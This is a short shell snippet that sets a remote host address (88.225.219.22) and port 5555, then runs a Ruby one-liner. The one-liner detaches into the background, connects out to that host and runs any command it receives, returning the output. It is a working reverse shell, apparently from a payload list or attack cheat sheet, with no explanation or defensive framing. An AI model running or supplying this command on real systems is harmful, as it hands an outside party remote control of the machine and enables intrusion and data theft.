export RHOST=88.225.219.22
export RPORT=5555
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
